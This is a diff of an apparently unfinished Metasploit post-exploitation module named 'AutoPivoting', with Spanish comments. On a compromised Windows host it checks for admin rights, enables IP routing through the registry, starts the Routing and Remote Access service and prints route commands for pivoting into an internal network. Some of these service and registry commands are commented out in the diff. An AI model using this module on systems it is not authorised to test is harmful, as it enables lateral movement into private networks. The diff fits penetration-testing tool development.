@@ -8,6 +8,11 @@ require 'msf/core/post/windows'
 
 class MetasploitModule < Msf::Post
 
+  include Msf::Post::File
+  include Msf::Post::Windows::Registry
+  include Msf::Post::Windows::Services
+  include Msf::Post::Windows::Priv
+
   def initialize(info={})
     super( update_info( info,
         'Name'          => 'AutoPivoting',
@@ -52,12 +57,28 @@ class MetasploitModule < Msf::Post
 		#
 		# Windows commands
 		#
-		print_status("Enabling IP Router...")
-		print_good(cmd_exec("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\" /f /v IPEnableRouter /t REG_DWORD /d 1"))
-		print_status("Enabling Routing and Remote Access service...")
-		print_good(cmd_exec("sc config RemoteAccess start= auto"))
-		print_status("Starting Routing and Remote Access service...")
-		print_good(cmd_exec("net start RemoteAccess"))
+		if is_admin?
+		
+			rra_status = service_info("RemoteAccess")
+			
+			# iprouting_status = --> Valor inicial del registro IPEnableRouter
+			# print_status("Initial values:")
+			# print_line("	El servicio RRA se encuentra #{rra_status}")
+			# print_line("	El valor de IPEnableRouter es #{iprouting_status}")
+			# https://www.offensive-security.com/metasploit-unleashed/api-calls/
+			# Lee las interfaces de red
+			# print_status(client.net.config.interfaces)
+			
+			print_status("status: #{service_info("RemoteAccess")[:status].to_s}")
+			print_status(service_info("RemoteAccess").to_s)
+			# print_status("Enabling IP Router...")
+			# print_good(cmd_exec("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\" /f /v IPEnableRouter /t REG_DWORD /d 1"))
+			# print_status("Enabling Routing and Remote Access service...")
+			# print_good(cmd_exec("sc config RemoteAccess start= auto"))
+			# print_status("Starting Routing and Remote Access service...")
+			# print_good(cmd_exec("net start RemoteAccess"))
+		else
+			print_bad("You have to be administrator to execute this module.")
 	end
 	#
   	# acciones segun eleccion plataforma
@@ -131,26 +152,23 @@ class MetasploitModule < Msf::Post
   	# funcion principal, donde se invocan los comandos necesarios segun la plataforma
   	#
 	def run
+		
 		if check_rnet()
-		# rra_status = --> Estado inicial del servicio RRA
-		# iprouting_status = --> Valor inicial del registro IPEnableRouter
-		# print_status("Initial values:")
-		# print_line("	El servicio RRA se encuentra #{rra_status}")
-		# print_line("	El valor de IPEnableRouter es #{iprouting_status}")
-		# https://www.offensive-security.com/metasploit-unleashed/api-calls/
-		# Lee las interfaces de red
-		print_status(client.net.config.interfaces)
-		print_status("OS: #{session.sys.config.sysinfo['OS']}")
-		print_status("Computer name: #{'Computer'} ")
-		print_status("Current user: #{session.sys.config.getuid}")
-		set_pivot()
-		create_route()
-		#para saber si las rutas son correctas
-		print_status("windows: route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
-  		print_status("linux: route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
+
+			# print_status("OS: #{session.sys.config.sysinfo['OS']}")
+			# print_status("Computer name: #{'Computer'} ")
+			# print_status("Current user: #{session.sys.config.getuid}")
+			set_pivot()
+			# create_route()
+			#para saber si las rutas son correctas
+			print_status("windows: route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
+			print_status("linux: route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
 		else
 			print_bad("Aborting Module.")
 		end
 			
   	end
 end
+
+# Service_info
+		#{:starttype=>2, :display=>"Routing and Remote Access", :startname=>"LocalSystem", :path=>"C:\\WINDOWS\\system32\\svchost.exe -k netsvcs", :logroup=>"", :interactive=>false, :dacl=>"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CR;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)", :status=>4}
